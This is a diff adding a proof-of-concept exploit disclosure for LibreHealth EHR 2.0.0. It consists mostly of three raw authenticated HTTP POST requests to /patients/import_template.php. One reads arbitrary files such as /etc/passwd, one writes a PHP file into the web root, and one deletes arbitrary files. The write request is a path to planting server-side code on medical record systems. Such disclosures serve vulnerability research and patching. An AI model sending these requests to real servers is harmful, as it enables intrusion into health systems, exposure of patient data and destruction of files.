@@ -1,0 +1,69 @@
+# Exploit Title: LibreHealth 2.0.0 - Arbitrary File Actions 
+# Date: 2018-10-19
+# Exploit Author: Carlos Avila
+# Vendor Homepage: https://librehealth.io/
+# Software Link: https://github.com/LibreHealthIO/lh-ehr
+# Version: < 2.0.0
+# Tested on: Debian LAMP, LibreHealth 2.0.0
+
+# LibreHealth is the 'fork' of the OpenEMR project. I have executed these PoCs 
+# based on on Bug Reported by Joshua Fam [@Insecurity]
+ 
+# 1.Arbitrary File Read:
+# In LibreHealth a user that has access to the portal patient (authenticated) can send a 
+# malicious POST request to read arbitrary files.
+ 
+POST /patients/import_template.php HTTP/1.1
+Host: 192.168.6.200
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:62.0) Gecko/20100101 Firefox/62.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: LibreHealthEHR=jujkd0kvkpde70328l2v79kl90; PHPSESSID=gi8mp1e30csk5k7ji2hjo99lu4
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Length: 60
+Content-Type: application/x-www-form-urlencoded
+
+mode=get&docid=/etc/passwd
+ 
+# This attack represents a file inclusion attack (LFI)
+# 2.Arbitrary File Write:
+# In LibreHealth a user that has access to the portal patient (authenticated) can send 
+# a malicious POST request to write arbitrary files.
+  
+POST /patients/import_template.php HTTP/1.1
+Host: 192.168.6.200
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:62.0) Gecko/20100101 Firefox/62.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: LibreHealthEHR=jujkd0kvkpde70328l2v79kl90; PHPSESSID=gi8mp1e30csk5k7ji2hjo99lu4
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Length: 60
+Content-Type: application/x-www-form-urlencoded
+
+mode=save&docid=payload.php&content=<?php phpinfo();?>
+
+# When you send the attack you can browse the website where the file was written and 
+# the payload.php at http://192.168.6.200/patients/payload.php
+# 3. Arbitrary File Delete:
+# In LibreHealth a user that has access to the portal patient (authenticated) can send a 
+# malicious POST request to delete a arbitrary file.
+      
+POST /patients/import_template.php HTTP/1.1
+Host: 192.168.6.200
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:62.0) Gecko/20100101 Firefox/62.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: LibreHealthEHR=jujkd0kvkpde70328l2v79kl90; PHPSESSID=gi8mp1e30csk5k7ji2hjo99lu4
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Length: 60
+Content-Type: application/x-www-form-urlencoded
+ 
+mode=delete&docid=payload.php
+        
+# When you make the attack you can navigate on the deleted page and you should receive 404 error (page not found)
